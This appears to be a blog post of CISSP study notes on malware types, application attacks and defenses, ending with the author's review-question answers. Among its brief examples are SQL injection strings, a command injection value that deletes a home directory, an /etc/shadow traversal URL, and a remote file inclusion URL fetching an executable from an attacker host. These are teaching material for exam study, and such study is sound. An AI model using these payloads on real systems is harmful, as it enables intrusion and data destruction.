---
layout: post
title: Chapter 21 Malicious Code and Application Attacks
subtitle: 
cover-img: [/assets/img/cover/study1.jpg, /assets/img/cover/study2.jpg, /assets/img/cover/study3.jpg]
thumbnail-img: https://i.imgur.com/Se6UFV3.png
share-img:
tags: [CISSP, Malicious Code]
categories: [Study]
---

Chatpter 21 Malicious Code and Application Attacks

<!-- vim-markdown-toc GFM -->

* [Malware](#malware)
  * [Sources of Malicious Code](#sources-of-malicious-code)
  * [Viruses](#viruses)
    * [Virus Propagation Techniques](#virus-propagation-techniques)
    * [Virus Technologies](#virus-technologies)
  * [Hoaxes (恶作剧)](#hoaxes-恶作剧)
  * [Logic Bombs (逻辑炸弹)](#logic-bombs-逻辑炸弹)
  * [Trojan Horses (特洛伊木马 / トロイの木馬)](#trojan-horses-特洛伊木马--トロイの木馬)
  * [Worms (ワーム / 蠕虫)](#worms-ワーム--蠕虫)
    * [Code Red Worm](#code-red-worm)
    * [Stuxnet (震网病毒)](#stuxnet-震网病毒)
    * [Spyware and Adware (间谍软件和广告软件)](#spyware-and-adware-间谍软件和广告软件)
  * [Ransomware](#ransomware)
  * [Malicious Scripts](#malicious-scripts)
* [Zero-Day Attacks](#zero-day-attacks)
* [Malware Prevention (预防恶意软件)](#malware-prevention-预防恶意软件)
  * [Platforms Vulnerable to Malware](#platforms-vulnerable-to-malware)
  * [Antimalware Software](#antimalware-software)
  * [Integrity Monitoring](#integrity-monitoring)
  * [Advanced Threat Protection](#advanced-threat-protection)
* [Application Attacks](#application-attacks)
  * [Buffer Overflows (缓冲区溢出)](#buffer-overflows-缓冲区溢出)
  * [Time of Check to Time of Use (TOCTTOU or TOC/TOU / 检查时间到使用时间)](#time-of-check-to-time-of-use-tocttou-or-toctou--检查时间到使用时间)
  * [Backdoors](#backdoors)
  * [Privilege Escalation and Rootkits](#privilege-escalation-and-rootkits)
* [Injection Vulnerabilities (注入漏洞)](#injection-vulnerabilities-注入漏洞)
  * [SQL Injection Attacks (SQL注入攻击)](#sql-injection-attacks-sql注入攻击)
    * [Blind Content-Based SQL Injection (基于内容的SQL盲注)](#blind-content-based-sql-injection-基于内容的sql盲注)
    * [Blind Timing-Based SQL Injection (基于定时的SQL盲注)](#blind-timing-based-sql-injection-基于定时的sql盲注)
  * [Code Injection Attacks (代码注入攻击)](#code-injection-attacks-代码注入攻击)
  * [Command Injection Attacks (命令注入攻击)](#command-injection-attacks-命令注入攻击)
* [Exploiting Authorization Vulnerabilities (利用授权漏洞)](#exploiting-authorization-vulnerabilities-利用授权漏洞)
  * [Insecure Direct Object References (不安全的直接对象引用)](#insecure-direct-object-references-不安全的直接对象引用)
  * [Directory Traversal (目录遍历)](#directory-traversal-目录遍历)
  * [File Inclusion (文件包含)](#file-inclusion-文件包含)
    * [Local file inclusion attacks](#local-file-inclusion-attacks)
    * [Remote file inclusion attacks](#remote-file-inclusion-attacks)
* [Exploiting Web Application Vulnerabilities](#exploiting-web-application-vulnerabilities)
  * [Cross-Site Scripting (XSS / 跨站脚本)](#cross-site-scripting-xss--跨站脚本)
  * [Reflected XSS (反射式XSS)](#reflected-xss-反射式xss)
  * [Stored/Persistent XSS (存储/持久XSS)](#storedpersistent-xss-存储持久xss)
  * [Request Forgery (请求伪造)](#request-forgery-请求伪造)
    * [Cross-Site Request Forgery (CSRF/XSRF/跨站请求伪造/クロスサイトリクエストフォージェリ)](#cross-site-request-forgery-csrfxsrf跨站请求伪造クロスサイトリクエストフォージェリ)
    * [Server-Side Request Forgery (SSRF/服务器端请求伪造/サーバ側要求の偽造)](#server-side-request-forgery-ssrf服务器端请求伪造サーバ側要求の偽造)
    * [Session Hijackin (会话劫持)](#session-hijackin-会话劫持)
  * [Application Security Controls](#application-security-controls)
    * [Input Validation](#input-validation)
  * [Web Application Firewalls](#web-application-firewalls)
  * [Database Security](#database-security)
    * [Parameterized Queries and Stored Procedures (参数化查询和存储过程)](#parameterized-queries-and-stored-procedures-参数化查询和存储过程)
    * [Obfuscation and Camouflage (混淆和伪装)](#obfuscation-and-camouflage-混淆和伪装)
  * [Code Security](#code-security)
    * [Code Signing](#code-signing)
    * [Code Reuse](#code-reuse)
    * [Software Diversity (软件多样性)](#software-diversity-软件多样性)
    * [Code Repositories (代码存储库)](#code-repositories-代码存储库)
    * [Integrity Measurement (完整性测量)](#integrity-measurement-完整性测量)
    * [Application Resilience (应用程序弹性)](#application-resilience-应用程序弹性)
* [Secure Coding Practices](#secure-coding-practices)
  * [Source Code Comments](#source-code-comments)
  * [Error Handling](#error-handling)
  * [Hard-Coded Credentials (硬编码凭据)](#hard-coded-credentials-硬编码凭据)
* [Memory Management](#memory-management)
  * [Resource Exhaustion (资源枯竭)](#resource-exhaustion-资源枯竭)
  * [Pointer Dereferencing (指针解除引用)](#pointer-dereferencing-指针解除引用)
* [Summary](#summary)
* [Exam Essentials](#exam-essentials)
* [Review Questions](#review-questions)

<!-- vim-markdown-toc -->

# Malware
## Sources of Malicious Code
- In the early days of computer security, malicious code writers were extremely skilled software developers who took pride in carefully crafting innovative malicious code techniques.
- Modern times have given rise to the script kiddie.

## Viruses
- The computer virus is perhaps the earliest form of malicious code.
- According to statistics compiled by AV-Test, an independent cybersecurity research organization
  - There were over 1.1 billion strains of malicious code roaming the global network in 2020
  - More than 350,000 new malware variants appearing on the internet every day! 
- Computer viruses have two main functions
  1. propagation (传播)
  1. payload execution

### Virus Propagation Techniques
Four common propagation techniques:
1. Master Boot Record (MBR) Viruses (主引导记录病毒)
  - One of the earliest known forms of virus infection.
  - Because the MBR is extremely small (usually 512 bytes), it can't contain all the code.
  - MBR viruses store the majority of their code on another portion of the storage media.
  - Viruses can attack both the MBR and the boot sector, with substantially similar results.
    - MBR viruses act by redirecting the system to an infected boot sector, which loads the virus into memory before loading the OS from the legitimate boot sector.
    - Boot sector viruses actually infect the legitimate boot sector and are loaded into memory during the operating system load process.
1. File Infector Viruses
  - Windows-based operating systems append to commands when executing program files (.com, .exe, and .bat, in that order)
  - In some cases, the virus might actually replace the entire file with an infected version.
  - Companion virus
    - A type of computer virus that creates new files alongside legitimate ones. These new files have a similar name but a different file extension. 
1. Macro Viruses (宏病毒 / マクロウィルス)
  - Melissa Virus:
    - A macro virus that spread via email in March 1999, primarily a Microsoft Word-based virus that infected Word documents and spread through email attachments.
    - When a user opened an infected Word document, the virus would replicate itself and send copies of the infected document to the user's Outlook email contacts.
  - I Love You Virus
    - Also known as the "Love Bug" or "Love Letter," emerged in May 2000 and spread via email.
    - It was a malicious Visual Basic script that arrived as an email attachment with the subject "ILOVEYOU."
    - When opened, the virus overwrote certain file types, including image and document files, and sent copies of itself to the recipient's Outlook contacts.
1. Service Injection Viruses 
  - Injecting themselves into trusted runtime processes of the operating system.

### Virus Technologies
- Four sneaky techniques in an attempt to escape detection:
1. Multipartite Viruses (多体病毒)
  - Use more than one propagation technique in an attempt to penetrate systems.
    >複数の拡散方法を使い分けてシステムに侵入しようとするウイルス
1. Stealth Viruses (隐形病毒)
  - Hide themselves by actually tampering with the operating system to fool antivirus packages into thinking that everything is functioning normally. 
    >OSを操作して、ウイルス対策ソフトを欺き、ウイルスが存在しないかのように振る舞う。
1. Polymorphic Viruses (多态病毒)
  - Modify their own code as they travel from system to system.
  - Propagation and destruction techniques remain the same, but the signature is somewhat different each time it infects a new system. 
    >システム間で移動しながら自身のコードを変更するウイルスで、署名は変わるが、感染と破壊方法は同じ。
1. Encrypted Viruses (加密病毒)
  - Use cryptographic techniques to avoid detection.
  - Each infected system has a virus with a different signature.
    >検出を回避するために暗号技術を使い、各システムで異なる署名を持つが、コードを変更せず、ディスク上の格納方法を変更して異なる署名を生成するウィルス。

## Hoaxes (恶作剧)
In addition to email messages, malware hoaxes now circulate via Facebook, Twitter etc.

## Logic Bombs (逻辑炸弹)
- Malicious code objects that infect a system and lie dormant until they are triggered by the occurrence of one or more conditions such as time, program launch, website logon, certain keystrokes, and so on. 

## Trojan Horses (特洛伊木马 / トロイの木馬)
A software program that appears benevolent but carries a malicious, behind-the-scenes payload that has the potential to wreak havoc on a system or network.

- One category of Trojan is rogue antivirus software (流氓防病毒软件). 
- Remote access Trojans (RATs) are a subcategory of Trojans that open backdoors in systems (打开系统后门).
- Other Trojans are designed to steal computing power from infected systems for use in mining Bitcoin or other cryptocurrencies ("cryptomalware" / 暗号化マルウェア / 加密恶意软件)

## Worms (ワーム / 蠕虫)
Propagate themselves without requiring any human intervention.
>人間の介入を必要とせずに自己増殖

### Code Red Worm
- in the summer of 2001
- among web servers running unpatched versions of Microsoft's IIS.

### Stuxnet (震网病毒)
- In mid-2010, a worm named Stuxnet surfaced on the internet.
- Stuxnet appeared to begin its spread in the Middle East, specifically on systems located in Iran.

### Spyware and Adware (间谍软件和广告软件)
- Spyware monitors your actions and transmits important details to a remote system that spies on your activity. 
- Adware uses a variety of techniques to display advertisements on infected computers.

## Ransomware
Ransomware is a type of malware that weaponizes cryptography. 
- Those with strong backup and recovery programs may suffer some downtime as they work to rebuild systems from those backups and remediate them to prevent a future infection.
- Those who lack data find themselves pressured to pay the ransom in order to regain access to their data.

## Malicious Scripts
- APT organizations often take advantage of scripts to automate routine portions of their malicious activity.
- Malicious scripts are also commonly found in a class of malware known as fileless malware. 

# Zero-Day Attacks
There are two main reasons systems are affected by zero-day vulnerabilities:
- The necessary delay between the discovery of a new type of malicious code and the issuance of patches and antivirus updates. This is known as the *window of vulnerability*.
- Slowness in applying updates on the part of system administrators.

# Malware Prevention (预防恶意软件)
## Platforms Vulnerable to Malware
- Most computer viruses are designed to disrupt activity on systems running versions of the world's most popular operating system—Microsoft Windows (83% In a 2020 analysis by av-test.org)
- Significantly, the amount of malware targeting Mac systems recently tripled.

## Antimalware Software
- The vast majority of these packages use a method known as signature-based detection to identify potential virus infections on a system. (基于签名的检测的方法) 
  - If any are detected
    - If the software can eradicate the virus  
      -> it **disinfects** the affected file
    - If the software recognizes the virus but doesn't know how to disinfect the files  
      -> it may **quarantine** the files 
    - If security settings/policies do not provide  
      -> it may delete the infected files 
- Many antivirus packages also use heuristic mechanisms to detect potential malware infections. (使用启发式机制来检测潜在的恶意软件感染)
  - A common strategy is for systems to quarantine suspicious files and send them to a malware analysis tool, where they are executed in an isolated but monitored environment. 
    - If the software behaves suspiciously in that environment
      - Added to blacklists throughout the organization
      - Rapidly updating antivirus signatures to meet new threats.

## Integrity Monitoring
- Provide a secondary antivirus functionality.
- Designed to alert administrators to unauthorized file modifications. 
- These systems work by maintaining a database of hash values for all files stored on the system.

## Advanced Threat Protection
- Endpoint detection and response (EDR) packages go beyond traditional antimalware protection to help protect endpoints against attack. 
- Managed detection and response (MDR)  
  Combines antimalware capabilities with a managed service that reduces the burden on the IT team.
- User and entity behavior analytics (UEBA) packages pay particular attention to user-based activity on endpoints and other devices.
- UEBA tools differ from EDR capabilities in that UEBA has an analytic focus on the user, whereas EDR has an analytic focus on the endpoint.

# Application Attacks
## Buffer Overflows (缓冲区溢出)
Buffer overflow vulnerabilities exist when a developer does not properly validate user input to ensure that it is of an appropriate size.

## Time of Check to Time of Use (TOCTTOU or TOC/TOU / 检查时间到使用时间)

## Backdoors
Backdoors are undocumented command sequences that allow individuals with knowledge of the backdoor to bypass normal access restrictions.

## Privilege Escalation and Rootkits
- Attackers often obtain access to a standard system user account through the use of a password attack or social engineering and then use a rootkit to increase their access to the root (or administrator) level. 
- This increase in access from standard to administrative privileges is known as a privilege escalation attack.

# Injection Vulnerabilities (注入漏洞)
eg. SQL injection, Lightweight Directory Access Protocol (LDAP), XML injection, command injection, HTML injection, code injection, and file injection.

## SQL Injection Attacks (SQL注入攻击)
Attackers use a technique called blind SQL injection to conduct an attack even when they don't have the ability to view the results directly. 
### Blind Content-Based SQL Injection (基于内容的SQL盲注)
For example, like `52019' AND 1=2;--`

### Blind Timing-Based SQL Injection (基于定时的SQL盲注)
like `52019'; WAITFOR DELAY '00:00:15'; --`  
If the application returns the result after a 15-second delay, it is likely vulnerable.

## Code Injection Attacks (代码注入攻击)
- Any environment that inserts user-supplied input into code written by an application developer may be vulnerable to a code injection attack.
- If a web server front end uses a script to craft LDAP statements based on input from a user, then LDAP injection is potentially a threat.
- XML injection is another type of injection attack, where the back-end target is an XML application. 
- DLL injection attack
- Cross-site scripting is an example of a code injection attack

## Command Injection Attacks (命令注入攻击)
Like `mchapple & rm -rf /home`, waging `system('mkdir /home/students/mchapple & rm -rf home')`

# Exploiting Authorization Vulnerabilities (利用授权漏洞)
## Insecure Direct Object References (不安全的直接对象引用)
For example, 
>https://www.mycompany.com/getDocument.php?documentID=1841
https://www.mycompany.com/getDocument.php?documentID=1843
https://www.mycompany.com/getDocument.php?documentID=1844

## Directory Traversal (目录遍历)
e.g.
>http://www.mycompany.com/../../../etc/shadow

The bad setting example:
><Directory "/path/to/your/document/root">  
    Options Indexes FollowSymLinks  
    AllowOverride All  
    Require all granted  
</Directory>

The good setting example:
><Directory "/path/to/your/document/root">  
    Options FollowSymLinks  
    AllowOverride None  
    Require all granted  
</Directory>

## File Inclusion (文件包含)
### Local file inclusion attacks
e.g.
>http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe
### Remote file inclusion attacks
e.g.
>http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe

# Exploiting Web Application Vulnerabilities
## Cross-Site Scripting (XSS / 跨站脚本)
XSS attacks occur when web applications allow an attacker to perform HTML injection, inserting their own HTML code into a web page.

## Reflected XSS (反射式XSS)
- XSS attacks commonly occur when an application allows reflected input.
- The best solution is to determine the type of input that the application will allow and then validate the input to ensure that it matches that pattern. 
- Output encoding is a set of related techniques that take user-supplied input and encode it using a series of rules that transform potentially dangerous content into a safe form. ([ref docs](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html))
  - HTML entity encoding
    >Convert & to \&amp;, < to \&lt;, > to \&gt;, " to \&quot;, ' to \&#x27;
  - HTML attribute encoding
    >Encode all characters with the HTML Entity \&#xHH; format, including spaces, where HH represents the hexadecimal value of the character in Unicode.  
    For example, A becomes \&#x41;.   
    All alphanumeric characters ([A-Za-z0-9]) remain unencoded.
  - URL encoding ([ref docs](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1))
    >Control names and values are escaped.  
     Space characters are replaced by \`+'  
     Non-alphanumeric characters are replaced by \`%HH'  
     Line breaks are represented as "CR LF" pairs (i.e., `%0D%0A')
  - JavaScript encoding
    >Encode all characters using the Unicode \uXXXX  
    where XXXX represents the hexadecimal Unicode code point.  
    For example, A becomes \u0041.   
    All alphanumeric characters ([A-Za-z0-9]) remain unencoded.
  - CSS hex encoding
    >CSS encoding supports both \XX and \XXXXXX formats.   
    the full six-character CSS encoding format by zero-padding the value.  
    For example, A becomes \41 (short format) or \000041 (full format).  
    All alphanumeric characters ([A-Za-z0-9]) remain unencoded.

## Stored/Persistent XSS (存储/持久XSS)

## Request Forgery (请求伪造)
### Cross-Site Request Forgery (CSRF/XSRF/跨站请求伪造/クロスサイトリクエストフォージェリ)
- XSS vs CSRF/XSRF
>XSS attacks exploit the trust that a user has in a website to execute code on the user's computer. XSRF attacks exploit the trust that remote sites have in a user's system to execute commands on the user's behalf.

- The ways to be against XSRF attacks:
  - To create web applications that use secure tokens that the attacker would not know to embed in the links.
  - To check the referring URL in requests received from end users and only accept requests that originated from their own site.

### Server-Side Request Forgery (SSRF/服务器端请求伪造/サーバ側要求の偽造)
SSRF attacks are possible when a web application accepts URLs from a user as input and then retrieves information from that URL. 

### Session Hijackin (会话劫持)
Session hijacking attacks occur when a malicious individual intercepts part of the communication between an authorized user and a resource and then uses a hijacking technique to take over the session and assume the identity of the authorized user. 

## Application Security Controls
### Input Validation
- The most effective form of input validation uses input whitelisting (also known as allow listing).
- It is very important to ensure that validation occurs server-side rather than within the client's browser.
- In some case, developers might use input blacklisting (also known as block listing) to control user input. 
- Metacharacters
  - single and double quotation marks '
  - the open/close square brackets "
  - the backslash []
  - the semicolon ;
  - the ampersand &
  - the caret ^
  - the dollar sign $
  - the period, or dot .
  - the vertical bar, or pipe symbol |
  - the question mark ?
  - the asterisk *
  - the plus sign +
  - open/close curly braces {}
  - open/close parentheses ( ) 

## Web Application Firewalls
- WAFs function similarly to network firewalls, but they work at the Application layer of the OSI model.
- Architech 
  
  +------------------------------------------------------+
  |   Internet -- Network Firewall -- Internal Network   |
  |                      |                               |
  |                     DMZ                              |
  |                      |                               |
  |                     WAF                              |
  |                      |                               |
  |                  Web Server                          |
  +------------------------------------------------------+
  
## Database Security
### Parameterized Queries and Stored Procedures (参数化查询和存储过程)
- Parameterized queries offer another technique to protect applications against injection attacks.
- Stored procedures protects against injection attacks and also improves database performance.

### Obfuscation and Camouflage (混淆和伪装)
- Data minimization is the best defense.
- Tokenization replaces personal identifiers that might directly reveal an individual's identity with a unique identifier using a lookup table.
- Hashing uses a cryptographic hash function to replace sensitive identifiers with an irreversible alternative identifier.

## Code Security
### Code Signing
- Code signing provides developers with a way to confirm the authenticity of their code to end users.

### Code Reuse
- Security teams should ensure that outsourced code is subjected to the same level of testing as internally developed code.
- Security professionals should be familiar with the various ways that third-party code is used in their organizations as well as the ways that their organization makes services available to others.

### Software Diversity (软件多样性)
Security professionals should watch for places in the organization that are dependent on a single piece of source code, binary executable files, or compiler. 

### Code Repositories (代码存储库)
Dead code is in use in an organization but nobody is responsible for the maintenance of that code and, in fact, nobody may even know where the original source files reside.

### Integrity Measurement (完整性测量)
Code integrity measurement uses cryptographic hash functions to verify that the code being released into production matches the code that was previously approved. 

### Application Resilience (应用程序弹性)
- Scalability
  - vertical scaling or “scaling up.”
  - horizontal scaling, or “scaling out.”
- Elasticity  
  Ability to scale both up and down on an as-needed basis.

# Secure Coding Practices
## Source Code Comments
- When placed in the right hands, comments are crucial.
- However, comments can also provide attackers with a road map explaining how code works.
- In the case of compiled executables, the compiler automatically removes comments from executable files.
- For web applications that expose their code, developers should remove comments from production versions of the code before deployment. 

## Error Handling
- Attackers thrive on exploiting errors in code.
- If error handling routines explain too much about the inner workings of code, they may allow an attacker to find a way to exploit the code. 
- A good general guideline is for error messages to display the minimum amount of information necessary for the user to understand the nature of the problem, insofar as it is within their control to correct it. 
- The application should then record as much information as possible in the application log so that developers investigating the error can correct the underlying issue.

## Hard-Coded Credentials (硬编码凭据)
There are two variations on this error.
- A hard-coded maintenance account for the application that allows the developer to regain access even if the authentication system fails (known as a backdoor vulnerability).
- Developers include access credentials for other services within their source code.

# Memory Management
## Resource Exhaustion (资源枯竭)
Memory leaks are one example of resource exhaustion.

## Pointer Dereferencing (指针解除引用)
If the application tries to dereference this NULL pointer, it causes a condition known as a null pointer exception. In the best case, a NULL pointer exception causes the program to crash.

# Summary
# Exam Essentials
- Understand the propagation techniques used by viruses.
  1. file infection
  1. service injection
  1. boot sector infection
  1. macro infection

- Explain the threat posed by ransomware.
- Know how antivirus software packages detect known viruses.
- Explain how user and entity behavior analytics (UEBA) functions.
- Be familiar with the various types of application attacks attackers use to exploit poorly written software. 
- Understand common web application vulnerabilities and countermeasures.

# Review Questions
1 D
2 C → B
3 C
4 B → A
5 B
6 B
7 D
8 C
9 A
10 D
11 B
12 C
13 A
14 A D → A B D
15 B
16 A
17 A → B
18 D
19 D
20 C

正解率：16 / 20 = 80%
